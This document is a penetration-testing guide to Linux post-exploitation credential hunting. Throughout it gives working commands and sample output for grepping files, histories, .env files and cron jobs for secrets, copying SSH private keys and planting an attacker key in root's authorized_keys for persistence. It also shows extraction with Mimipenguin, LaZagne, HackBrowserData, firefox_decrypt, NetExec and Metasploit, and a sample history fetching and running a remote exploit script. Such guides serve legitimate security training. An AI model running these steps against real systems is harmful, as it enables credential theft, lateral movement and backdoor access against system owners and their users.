# Local Credential Exposure

## Linux Credentials Hunting

### Overview

**Credentials Hunting** is the systematic process of discovering passwords, authentication tokens, API keys, SSH keys, and other sensitive authentication materials stored on a Linux system. This is a critical phase of post-exploitation that can dramatically accelerate privilege escalation, lateral movement, and deeper network penetration.

Credentials exist in many forms across a Linux system: plaintext passwords in configuration files, cached credentials in memory, command history containing authentication strings, browser-stored passwords, SSH private keys, database connection strings, and API tokens in application files. A thorough credential hunting methodology examines all potential storage locations to build a comprehensive credential database for further exploitation.

**Key Concepts:**

* **Credential Reuse** - Users often reuse passwords across systems and services
* **Cached Credentials** - Systems store authentication data in memory and cache
* **Configuration Files** - Applications store credentials in plain or obfuscated formats
* **SSH Keys** - Private keys provide passwordless authentication to other systems
* **Browser Keyrings** - Modern browsers store credentials in encrypted databases
* **Command History** - Shell history often contains passwords used in commands

**Why Credential Hunting Matters:**

* Enables privilege escalation through password reuse
* Facilitates lateral movement to other systems
* Discovers service accounts with elevated privileges
* Reveals API keys for external services and databases
* Provides access to encrypted data and protected resources
* Maps trust relationships between systems

**Common Credential Locations:**

* Configuration files (.conf, .config, .env, .xml, .json, .yaml)
* Application databases (SQLite, MySQL dumps, flat files)
* Shell history files (.bash\_history, .zsh\_history, .mysql\_history)
* SSH directories (.ssh/id\_rsa, authorized\_keys, known\_hosts)
* Browser profile directories (Firefox, Chrome, Chromium)
* System memory (running processes, cached passwords)
* Log files (authentication logs, application logs, error logs)
* Backup files (.bak, .backup, .old, \~)

***

### Exploitation Workflow Summary

1. File System Credential Discovery ├─ Configuration files (.conf, .env, .xml, .json) ├─ Database files and dumps ├─ Script files (shell, Python, PHP) ├─ Notes and documentation └─ Backup files
2. Command History Analysis ├─ Bash history (.bash\_history) ├─ Shell configuration (.bashrc, .profile) ├─ Application-specific history (.mysql\_history, .psql\_history) └─ Log file examination
3. SSH Key Harvesting ├─ Private keys (id\_rsa, id\_dsa, id\_ecdsa, id\_ed25519) ├─ Public keys and authorized\_keys ├─ Known hosts mapping └─ SSH configuration files
4. Memory and Cache Extraction ├─ Process memory dumping ├─ System cache analysis ├─ Browser keyring extraction └─ Service credential caching
5. Browser Credential Extraction ├─ Firefox profile databases ├─ Chrome/Chromium credential stores ├─ Stored form data and cookies └─ Session token harvesting

***

### Phase 1: File System Credential Discovery

#### Understanding Credential Storage

Applications and users store credentials in various file formats. The most common locations are configuration files, where developers hardcode credentials for database connections, API access, and service authentication. These files often contain credentials in plaintext due to operational requirements or poor security practices.

#### Comprehensive File Search

**All-in-one grep search for credentials:**

```bash
grep -r -i -E "config|password|ini|passwd|pwd|hash|hashed|secret|key|token|credentials|auth|ssh|mysql|postgres|dbpass|db_password|dbuser|db_user" / 2>/dev/null
```

**Parameters explained:**

* `-r` - Recursive search through directories
* `-i` - Case-insensitive matching
* `-E` - Extended regex support
* `2>/dev/null` - Suppress permission denied errors

**Why this matters:** This single command searches file contents for keyword patterns that indicate credentials. However, it's very noisy and slow on large filesystems.

**Comprehensive file name search:**

```bash
find / -type f \( -iname "*config*" -o -iname "*password*" -o -iname "*ini*" -o -iname "*passwd*" -o -iname "*pwd*" -o -iname "*hash*" -o -iname "*hashed*" -o -iname "*secret*" -o -iname "*key*" -o -iname "*token*" -o -iname "*credentials*" -o -iname "*auth*" -o -iname "*ssh*" -o -iname "*mysql*" -o -iname "*postgres*" -o -iname "*dbpass*" -o -iname "*db_password*" -o -iname "*dbuser*" -o -iname "*db_user*" -o -iname "*.conf" -o -iname "*.cfg" -o -iname "*.ini" -o -iname "*.env" -o -iname "*.properties" -o -iname "*.json" -o -iname "*.yaml" -o -iname "*.yml" -o -iname "*.xml" -o -iname "*.sh" -o -iname "*.py" -o -iname "*.php" \) 2>/dev/null
```

**Parameters explained:**

* `-type f` - Only files (not directories)
* `-iname` - Case-insensitive filename match
* `-o` - OR operator (match any pattern)
* `\(` and `\)` - Group multiple conditions

**Why this approach is better:** Searching filenames is much faster than searching contents and catches files even if credentials use different keywords internally.

#### Configuration Files

**Search by file extension:**

```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

**Expected output:**

```
File extension:  .conf
/etc/apache2/apache2.conf
/etc/mysql/mysql.conf.d/mysqld.cnf
/var/www/html/config/database.conf

File extension:  .config
/home/user/.config/application.config
/opt/app/settings.config

File extension:  .cnf
/etc/mysql/my.cnf
/home/user/.my.cnf
```

**Why exclude certain directories:** The `grep -v` filters out system libraries and fonts that won't contain useful credentials, making output cleaner.

**Search for credentials in .cnf files:**

```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

**Expected output:**

```
File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user            = mysql

File:  /home/user/.my.cnf
user=dbadmin
password=SuperSecretDBPass123!
```

**Why filter comments:** The `grep -v "\#"` removes commented-out lines that aren't active credentials.

#### Web Application Credentials

**WordPress configuration example:**

```bash
cat /var/www/html/wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```

**Expected output:**

```php
define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'WPadmin123!' );
```

**Common web application config locations:**

```bash
# WordPress
/var/www/html/wp-config.php

# Drupal
/var/www/html/sites/default/settings.php

# Joomla
/var/www/html/configuration.php

# Generic PHP apps
/var/www/html/config.php
/var/www/html/includes/config.php
/var/www/html/config/database.php
```

**Search all PHP config files:**

```bash
find /var/www -name "config*.php" -o -name "*config.php" 2>/dev/null
```

**Extract credentials from PHP files:**

```bash
grep -r "password\|db_pass\|dbpass" /var/www/*.php 2>/dev/null
```

#### Environment Files

**Search for .env files (common in modern frameworks):**

```bash
find / -name ".env" -type f 2>/dev/null
```

**Expected output:**

```
/var/www/laravel/.env
/home/user/projects/app/.env
/opt/nodejs-app/.env
```

**Read .env file contents:**

```bash
cat /var/www/laravel/.env
```

**Expected output:**

```
APP_NAME=Laravel
APP_ENV=production
APP_KEY=base64:abcd1234...
APP_DEBUG=false
APP_URL=https://example.com

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=production_db
DB_USERNAME=dbadmin
DB_PASSWORD=Pr0duction_P@ss!

MAIL_MAILER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=apiuser
MAIL_PASSWORD=smtp_password_123

AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

**Why .env files are gold mines:** They contain all service credentials, API keys, and secrets needed for application operation.

#### Spool and Mail Directories

**Search mail directories:**

```bash
find /var/spool/mail -type f 2>/dev/null
find /var/mail -type f 2>/dev/null
```

**Read mail contents:**

```bash
cat /var/spool/mail/root
cat /var/mail/user
```

**Why this matters:** Email often contains password reset links, credentials sent by administrators, or sensitive information.

#### Configuration File Deep Dive

**Find all config-related files:**

```bash
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

**Expected output:**

```
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/python3/debian_config
/etc/kbd/config
/etc/manpath.config
/boot/config-4.4.0-116-generic
/home/user/.config/app/settings.config
/var/www/api/config/database.config
```

**Extract credentials from SSH config:**

```bash
cat /etc/ssh/sshd_config | grep -v "^#" | grep -i "password\|permit"
```

**Expected output:**

```
PermitRootLogin yes
PasswordAuthentication yes
```

#### Document and Spreadsheet Files

**Search for documents:**

```bash
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

**Expected output:**

```
File extension:  .csv
/home/user/Documents/passwords.csv
/home/user/Documents/employee-list.csv
/var/backups/database-export.csv

File extension:  .xlsx
/home/admin/Documents/infrastructure.xlsx
/home/admin/Desktop/credentials.xlsx

File extension:  .pdf
/home/user/Documents/network-diagram.pdf
/home/user/Documents/admin-guide.pdf
```

**Why these files matter:** Users often store credential lists, infrastructure documentation, and sensitive information in documents for "convenience."

**Read CSV files for credentials:**

```bash
cat /home/user/Documents/passwords.csv
```

**Expected output:**

```
Service,Username,Password,Notes
MySQL Production,root,MySQLr00t!2023,Main database
SSH Backup Server,backup_admin,BackupP@ss123,Weekly backups
AWS Console,admin@company.com,AWSadm!n2023,Root account
```

#### Database Files

**Search for database files:**

```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

**Expected output:**

```
DB File extension:  .sql
/var/backups/database-dump.sql
/home/user/backup.sql
/tmp/export.sql

DB File extension:  .db
/var/www/app/database.db
/home/user/.local/share/app/data.db

DB File extension:  .sqlite
/var/www/cms/content.sqlite
```

**Extract credentials from SQL dumps:**

```bash
grep -i "INSERT INTO.*users\|password\|hash" /var/backups/database-dump.sql
```

**Expected output:**

```sql
INSERT INTO `users` VALUES (1,'admin','$2y$10$abcd...1234','admin@localhost','2023-01-15');
INSERT INTO `users` VALUES (2,'dbadmin','$2y$10$efgh...5678','db@localhost','2023-02-20');
```

**Read SQLite databases:**

```bash
sqlite3 /var/www/app/database.db "SELECT * FROM users;"
```

**Expected output:**

```
1|admin|admin@example.com|$2y$10$N9qo8u...
2|user1|user1@example.com|$2y$10$92IXU...
```

#### Notes and Text Files

**Search for text files in user directories:**

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

**Expected output:**

```
/home/user/Documents/notes.txt
/home/user/Desktop/passwords.txt
/home/user/TODO
/home/admin/credentials.txt
```

**Common note filenames to check:**

```bash
find /home -name "note*" -o -name "password*" -o -name "cred*" -o -name "TODO*" -o -name "README*" 2>/dev/null
```

**Read note files:**

```bash
cat /home/user/Desktop/passwords.txt
```

**Expected output:**

```
Server Passwords:
=================
SSH: ssh_p@ssw0rd
MySQL: mysql_admin_123
FTP: ftp_upload_pass
VPN: vpn_access_2023
```

#### Scripts and Source Code

**Search for script files:**

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

**Expected output:**

```
File extension:  .py
/home/user/scripts/backup.py
/var/www/api/app.py
/opt/automation/deploy.py

File extension:  .sh
/home/user/scripts/database-backup.sh
/opt/scripts/cleanup.sh
/usr/local/bin/deploy.sh
```

**Search scripts for credentials:**

```bash
grep -r "password\|passwd\|pwd\|api_key\|secret" /home/user/scripts/*.sh 2>/dev/null
```

**Expected output:**

```bash
/home/user/scripts/backup.sh:DB_PASSWORD="BackupDBPass123"
/home/user/scripts/backup.sh:mysql -u backup -p"BackupDBPass123" production_db > backup.sql
/home/user/scripts/deploy.sh:export API_KEY="sk_live_abc123def456"
```

**Python scripts often contain credentials:**

```bash
cat /var/www/api/app.py | grep -A5 "password\|connection\|auth"
```

**Expected output:**

```python
db_config = {
    'host': 'localhost',
    'user': 'api_user',
    'password': 'API_DB_Pass_2023!',
    'database': 'api_production'
}
```

#### Cron Jobs

**Check system crontab:**

```bash
cat /etc/crontab
```

**Expected output:**

```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

0 2 * * * root /usr/local/bin/backup.sh --password="Cron_Backup_P@ss"
30 3 * * * root mysqldump -u backup -p'MySQL_Backup_123' production_db > /backups/db.sql
```

**Why cron jobs leak credentials:** Scripts must contain credentials or paths to credential files to run unattended.

**List all cron directories:**

```bash
ls -la /etc/cron*/
```

**Expected output:**

```
/etc/cron.d:
-rw-r--r-- 1 root root  102 Nov 16  2017 .placeholder
-rw-r--r-- 1 root root  285 May 29  2017 php

/etc/cron.daily:
-rwxr-xr-x 1 root root  311 May 29  2017 0anacron
-rwxr-xr-x 1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x 1 root root  123 Dec 20 10:00 backup.sh
-rwxr-xr-x 1 root root  456 Dec 15 14:30 database-sync.sh
```

**Read cron scripts for credentials:**

```bash
cat /etc/cron.daily/backup.sh
```

**Expected output:**

```bash
#!/bin/bash
BACKUP_USER="backup_admin"
BACKUP_PASS="Daily_Backup_P@ss!"
mysqldump -u $BACKUP_USER -p$BACKUP_PASS production > /backups/daily.sql
```

**Check user-specific cron jobs:**

```bash
cat /var/spool/cron/crontabs/* 2>/dev/null
```

#### Advanced File Discovery

**Search for specific credential patterns:**

```bash
find /mnt/Finance/ -name *cred*
```

**Expected output:**

```
/mnt/Finance/Contracts/private/credentials.txt
/mnt/Finance/Admin/db_credentials.xlsx
```

**Grep for credentials in specific directory:**

```bash
grep -rn /mnt/Finance/ -ie cred 2>/dev/null
```

**Expected output:**

```
/mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials!
/mnt/Finance/Contracts/private/secret.txt:1:file with all credentials
/mnt/Finance/Admin/notes.txt:5:Database credentials: dbadmin / DBP@ss123
```

**Parameters explained:**

* `-r` - Recursive search
* `-n` - Show line numbers
* `-i` - Case-insensitive
* `-e` - Regex pattern

***

### Phase 2: Command History Analysis

#### Bash History Files

**Understanding bash history:** The `.bash_history` file stores commands entered by users. Administrators often type passwords directly in commands, exposing them in history.

**Check current user's bash history:**

```bash
cat ~/.bash_history
```

**Expected output:**

```bash
mysql -u root -p
SuperSecretPass123!
ssh admin@192.168.1.10
ls -la
sudo su
P@ssw0rd123
cat /etc/shadow
wget http://10.0.0.5/exploit.sh
chmod +x exploit.sh
./exploit.sh
```

**Why this is valuable:** Users type passwords when authentication fails, forget syntax, or script without properly securing credentials.

**Check all users' bash history:**

```bash
tail -n5 /home/*/.bash*
```

**Expected output:**

```
==> /home/user/.bash_history <==
vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py user 6mX4UP1eWH3HXK

==> /home/admin/.bash_history <==
mysql -u root -pMySQLr00t123
ssh-keygen -t rsa
scp backup.tar.gz admin@192.168.1.50:/backups/
systemctl restart apache2
sudo -i

==> /home/admin/.bashrc <==
alias ll='ls -la'
export DB_PASSWORD="Admin_DB_Pass!"
```

#### Other Shell History Files

**Check zsh history:**

```bash
cat ~/.zsh_history
```

**Check MySQL history:**

```bash
cat ~/.mysql_history
```

**Expected output:**

```sql
SELECT * FROM users;
UPDATE users SET password='newpass123' WHERE username='admin';
CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'NewUserPass123!';
GRANT ALL PRIVILEGES ON *.* TO 'admin'@'%' IDENTIFIED BY 'AdminDBPass!';
```

**Check PostgreSQL history:**

```bash
cat ~/.psql_history
```

**Check Python history:**

```bash
cat ~/.python_history
```

**Check Redis CLI history:**

```bash
cat ~/.rediscli_history
```

**Why application histories matter:** Database clients and interpreters store command history, often including credential creation and modification commands.

#### Shell Configuration Files

**Check bashrc and profile files:**

```bash
cat ~/.bashrc
cat ~/.bash_profile
cat ~/.profile
cat /etc/profile
cat /etc/bash.bashrc
```

**Expected output:**

```bash
# User specific aliases and functions
export DB_HOST="localhost"
export DB_USER="appuser"
export DB_PASS="App_DB_Pass_2023!"
export API_KEY="sk_live_abc123def456xyz789"

alias dbconnect='mysql -u appuser -p"App_DB_Pass_2023!" production_db'
alias backup='rsync -avz /data/ backup@192.168.1.100:/backups/ --password-file=/home/user/.rsync_pass'
```

**Why this matters:** Users create aliases and export variables with credentials for convenience, permanently storing them in shell configs.

***

### Phase 3: SSH Key Harvesting

#### Understanding SSH Keys

**SSH keys provide passwordless authentication** to remote systems. A compromised private key grants access to any system that trusts the corresponding public key, often with no additional authentication required.

**Key types:**

* **id\_rsa** - RSA algorithm (most common)
* **id\_dsa** - DSA algorithm (legacy, less common)
* **id\_ecdsa** - Elliptic Curve DSA
* **id\_ed25519** - Ed25519 (modern, most secure)

#### Finding SSH Private Keys

**Search for SSH private keys:**

```bash
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

**Expected output:**

```
/home/user/.ssh/id_rsa:1:-----BEGIN RSA PRIVATE KEY-----
/home/admin/.ssh/backup_key:1:-----BEGIN RSA PRIVATE KEY-----
/home/admin/.ssh/old_key.pem:1:-----BEGIN RSA PRIVATE KEY-----
```

**Parameters explained:**

* `-r` - Recursive search
* `-n` - Show line numbers
* `-w` - Match whole words
* `grep ":1"` - Filter for line 1 (beginning of key file)

**Alternative search methods:**

```bash
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
```

**Expected output:**

```
/home/user/.ssh/id_rsa
/home/admin/.ssh/id_rsa
/root/.ssh/id_rsa
/home/service/.ssh/backup_key.pem
/opt/app/keys/service_key.pem
```

**Search for private keys by content:**

```bash
grep -r "BEGIN.*PRIVATE KEY" /home /root /opt 2>/dev/null
```

#### Examining SSH Directories

**List SSH directory contents:**

```bash
ls -la ~/.ssh/
```

**Expected output:**

```
total 24
drwx------  2 user user 4096 Dec 20 10:00 .
drwxr-xr-x 15 user user 4096 Dec 20 09:30 ..
-rw-------  1 user user 1876 Dec 15 14:00 id_rsa
-rw-r--r--  1 user user  398 Dec 15 14:00 id_rsa.pub
-rw-r--r--  1 user user 1234 Dec 18 11:20 known_hosts
-rw-r--r--  1 user user  556 Dec 10 08:45 authorized_keys
-rw-------  1 user user  322 Dec 05 16:30 config
```

**Files explained:**

* `id_rsa` - Private key (must be kept secret)
* `id_rsa.pub` - Public key (can be shared)
* `known_hosts` - Hosts the user has connected to
* `authorized_keys` - Public keys allowed to authenticate as this user
* `config` - SSH client configuration

**Read SSH config for connection details:**

```bash
cat ~/.ssh/config
```

**Expected output:**

```
Host prod-server
    HostName 192.168.1.100
    User admin
    IdentityFile ~/.ssh/prod_key
    Port 22

Host backup-server
    HostName 10.0.0.50
    User backup
    IdentityFile ~/.ssh/backup_key.pem
    Port 2222
```

**Why this matters:** SSH config reveals:

* Target systems user has access to
* Usernames on those systems
* Which private keys to use
* Non-standard SSH ports

#### Analyzing known\_hosts

**Read known\_hosts file:**

```bash
cat ~/.ssh/known_hosts
```

**Expected output:**

```
192.168.1.100 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB...
10.0.0.50 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB...
github.com ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB...
gitlab.company.local ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB...
```

**Why this matters:** Known\_hosts reveals:

* All systems user has SSH'd to previously
* Internal hostnames and IP addresses
* Potential lateral movement targets
* Infrastructure mapping

**Extract hostnames and IPs:**

```bash
cat ~/.ssh/known_hosts | cut -d' ' -f1
```

#### Using Found SSH Keys

**Copy private key to attacker machine:**

```bash
cat /home/user/.ssh/id_rsa
```

**On attacker machine, save and set permissions:**

```bash
vim id_rsa
# Paste key content
chmod 600 id_rsa
```

**Use key to connect:**

```bash
ssh -i id_rsa user@10.10.10.10
```

**Expected result:**

```
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)
Last login: Mon Dec 20 10:00:00 2025 from 10.0.0.5

user@remotehost:~$
```

**If root's SSH directory is accessible:**

```bash
ls -la /root/.ssh/
cat /root/.ssh/id_rsa
```

**Using root's private key:**

```bash
ssh -i root_id_rsa root@10.10.10.10
```

**Expected result:**

```
root@remotehost:~#
```

**Why this is powerful:** Direct root access without password, bypassing most authentication controls.

#### Planting SSH Keys (Write Access)

**If you have write access to .ssh directory, plant your public key:**

**Generate SSH key pair on attacker:**

```bash
ssh-keygen -f attack_key
```

**Expected output:**

```
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 

Your identification has been saved in attack_key
Your public key has been saved in attack_key.pub
The key fingerprint is:
SHA256:abcd1234efgh5678ijkl9012mnop3456qrst7890 attacker@kali
```

**Copy public key content:**

```bash
cat attack_key.pub
```

**Expected output:**

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... attacker@kali
```

**On target, add to authorized\_keys:**

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... attacker@kali" >> /root/.ssh/authorized_keys
```

**Or for specific user:**

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... attacker@kali" >> /home/user/.ssh/authorized_keys
```

**Connect with your private key:**

```bash
ssh -i attack_key root@10.10.10.10
```

**Expected result:**

```
root@remotehost:~#
```

**Why this establishes persistence:** Your key remains valid even if passwords change, providing backdoor access.

#### Metasploit SSH Credential Gathering

**Using Metasploit post-exploitation module:**

```
meterpreter > run post/multi/gather/ssh_creds
```

**Expected output:**

```
[*] Determining session platform and type...
[*] Checking for OpenSSH profile in: /root/.ssh
[+] Downloading /root/.ssh/authorized_keys
[+] Downloading /root/.ssh/id_rsa
[+] Downloading /root/.ssh/id_rsa.pub
[+] Downloading /root/.ssh/known_hosts
[*] Checking for OpenSSH profile in: /home/user/.ssh
[+] Downloading /home/user/.ssh/authorized_keys
[+] Downloading /home/user/.ssh/id_rsa
[+] Downloading /home/user/.ssh/id_rsa.pub
[+] Downloading /home/user/.ssh/known_hosts
[*] Post module execution completed
```

**Why use Metasploit:** Automatically harvests all SSH keys from all user directories.

***

### Phase 4: Memory and Cache Extraction

#### Understanding Memory Credentials

**Modern Linux systems cache credentials in memory** for performance and user convenience. These include plaintext passwords, authentication tokens, Kerberos tickets, and session cookies. Memory extraction tools can recover these credentials from running processes.

#### Mimipenguin - Linux Password Extraction

**What Mimipenguin does:** Extracts plaintext passwords from memory, specifically targeting GNOME desktop environments where passwords are cached.

**Download and execute:**

```bash
sudo python3 mimipenguin.py
```

**Expected output:**

```
[sudo] password for user: 

[SYSTEM - GNOME]	user:MyPlaintextPassword123!
[SYSTEM - GNOME]	admin:AdminPass!2023
```

**Alternative execution method:**

```bash
sudo bash mimipenguin.sh
```

**Expected output:**

```
MimiPenguin Results:
[SYSTEM - GNOME]          user:MyPlaintextPassword123!
[SYSTEM - GNOME]          admin:AdminPass!2023
```

**Why this works:** GNOME Keyring stores passwords in memory in a recoverable format. Mimipenguin locates and extracts them from process memory.

**Requirements:**

* Root or sudo access
* GNOME desktop environment running
* User must be logged in with active session

#### LaZagne - All-in-One Credential Recovery

**What LaZagne does:** Comprehensive credential recovery tool that extracts passwords from multiple sources including system files, browser databases, and memory.

**Execute LaZagne:**

```bash
sudo python2.7 laZagne.py all
```

**Expected output:**

```
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::

[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL...

[+] Password found !!!
Login: user
Password: MyPlaintextPassword123!

------------------- Wifi -----------------

[+] Password found !!!
SSID: CompanyWiFi
Password: WiFi_P@ss_2023!

------------------- Environment variables -----------------

[+] Password found !!!
Variable: DB_PASSWORD
Value: Database_Pass_123!

[+] 5 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.50 seconds
```

**Why LaZagne is powerful:** Single tool that checks:

* Shadow file hashes
* Environment variables
* WiFi passwords
* Browser stored passwords
* SSH keys
* Application-specific credentials

**Run with verbose output:**

```bash
sudo python2.7 laZagne.py all -v
```

#### Linikatz V2 - Advanced Memory Dumping

**What Linikatz does:** Advanced memory credential extraction specifically designed for Linux, inspired by Mimikatz on Windows.

**Basic execution:**

```bash
sudo ./linikatz
```

**Features:**

* Extracts credentials from memory
* Dumps process authentication data
* Recovers cached passwords
* Extracts Kerberos tickets (if configured)

***

### Phase 5: Browser Credential Extraction

#### Understanding Browser Credential Storage

**Modern browsers store credentials in encrypted databases.** However, the encryption keys are accessible to the local user, making stored passwords recoverable with the right tools. Browsers cache:

* Website login credentials
* Credit card information
* Autofill form data
* Session cookies
* Authentication tokens

#### HackBrowserData - All Browsers

**What HackBrowserData does:** Universal browser credential extraction tool supporting Chrome, Chromium, Edge, Firefox, and more.

**Download and execute:**

```bash
./hack-browser-data
```

**Expected output:**

```
[INFO] Start Decrypt Browsers Data:
[INFO] Chrome Profile: Default
[INFO]   - Passwords: 15 found
[INFO]   - Cookies: 342 found
[INFO]   - History: 1523 found
[INFO]   - Credit Cards: 2 found

[SUCCESS] Exported to: results/chrome_default/

Credentials:
https://mail.company.com - admin@company.com:AdminMailPass!
https://gitlab.company.com - developer:GitLabP@ss123
https://aws.amazon.com - root@company.com:AWSRoot2023!
```

**Why this is valuable:** Extracts all stored credentials from all browser profiles in one command.

#### Firefox Credential Extraction

**Locate Firefox profile:**

```bash
ls -l ~/.mozilla/firefox/ | grep default
```

**Expected output:**

```
drwx------ 11 user user 4096 Dec 20 16:02 1bplpd86.default-release
drwx------  2 user user 4096 Dec 20 13:30 lfx3lvhb.default
```

**Examine logins.json file:**

```bash
cat ~/.mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

**Expected output:**

```json
{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://company.com",
      "httpRealm": null,
      "formSubmitURL": "https://company.com/login",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...encrypted...",
      "encryptedPassword": "MEIEEPgAAAA...encrypted...",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "version": 3
}
```

**Why manual inspection matters:** Shows what sites have stored credentials, even if you can't decrypt them immediately.

#### Firefox\_decrypt - Decrypt Firefox Passwords

**Download and execute:**

```bash
python3.9 firefox_decrypt.py
```

**Expected output:**

```
Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.company.com
Username: 'testuser'
Password: 'TestPass123!'

Website:   https://company.com
Username: 'admin'
Password: 'AdminP@ss2023!'

Website:   https://gitlab.company.com
Username: 'developer'
Password: 'DevGitPass!'
```

**Why this works:** Firefox encrypts passwords with a master key stored in the profile. The tool decrypts using that key.

#### LaZagne for Browser Passwords

**Extract browser credentials with LaZagne:**

```bash
python3 laZagne.py browsers
```

**Expected output:**

```
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.company.com
Login: testuser
Password: TestPass123!

[+] Password found !!!
URL: https://company.com
Login: admin
Password: AdminP@ss2023!

------------------- Chrome passwords -----------------

[+] Password found !!!
URL: https://mail.company.com
Login: admin@company.com
Password: MailAdminPass!

[+] Password found !!!
URL: https://aws.amazon.com
Login: root@company.com
Password: AWSConsole2023!

[+] 4 passwords have been found.
elapsed time = 0.23 seconds
```

**Why LaZagne is preferred:** Works across multiple browsers automatically.

#### NetExec (CrackMapExec) Firefox Module

**Using NetExec to extract Firefox credentials:**

```bash
cme smb 10.10.10.10 -u user -p password -M firefox
```

**Expected output:**

```
SMB   10.10.10.10   445   TARGET   [*] Windows 10.0 Build 19041 x64 (name:TARGET) (domain:CORP) (signing:False) (SMBv1:False)
SMB   10.10.10.10   445   TARGET   [+] CORP\user:password
FIREFOX 10.10.10.10   445   TARGET   [+] Found Firefox profile at: C:\Users\user\AppData\Roaming\Mozilla\Firefox\Profiles\abc123.default
FIREFOX 10.10.10.10   445   TARGET   [+] https://company.com - admin:AdminPass123!
FIREFOX 10.10.10.10   445   TARGET   [+] https://mail.company.com - admin@company.com:MailPass!
```

**List available CrackMapExec modules:**

```bash
cme smb -L | grep -i firefox
```

**Expected output:**

```
[*] firefox                   Dump credentials from Firefox
```

#### Metasploit Browser Credential Module

**Using Metasploit post-exploitation:**

```
meterpreter > run post/multi/gather/firefox_creds
```

**Expected output:**

```
[*] Checking for Firefox directory in: C:\Users\user\AppData\Roaming\Mozilla\Firefox\Profiles\
[+] Found Firefox profile: abc123.default-release
[*] Downloading logins.json...
[*] Downloading key4.db...
[*] Decrypting credentials...
[+] https://company.com
    Username: admin
    Password: AdminPass123!
[+] https://mail.company.com
    Username: admin@company.com
    Password: MailAdminPass!
[*] Credentials saved to: /root/.msf4/loot/...
```

***

### Advanced Credential Hunting with EvilTree

#### Understanding EvilTree

**EvilTree** is a specialized tool for regex-based credential hunting in file systems. It searches for patterns matching passwords, API keys, tokens, and other sensitive data using customizable regular expressions.

#### Basic EvilTree Usage

**Search for password patterns:**

```bash
python3 eviltree.py -r /var/www -x ".{0,3}passw.{0,3}[=]{1}.{0,18}" -i -v -q -L 3
```

**Parameters explained:**

* `-r /var/www` - Root directory to search
* `-x ".{0,3}passw.{0,3}[=]{1}.{0,18}"` - Regex pattern for passwords
* `-i` - Case-insensitive
* `-v` - Verbose output
* `-q` - Quiet mode (less noise)
* `-L 3` - Limit recursion depth to 3 levels

**Expected output:**

```
[+] /var/www/html/config.php
    db_password="MySQLPass123!"
    
[+] /var/www/api/.env
    DB_PASSWORD=ProductionDBPass!
    API_PASSWORD=APIKey_abc123
    
[+] /var/www/html/wp-config.php
    define('DB_PASSWORD', 'WordPress_DB_Pass!');
```

**Comprehensive search with keyword matching:**

```bash
python3 eviltree.py -r / -x ".{0,3}passw.{0,3}[=]{1}.{0,18}" -k passw,db_,admin,account,user,token -i -v -q -A -f -L 3
```

**Parameters explained:**

* `-k passw,db_,admin,account,user,token` - Keywords to search for
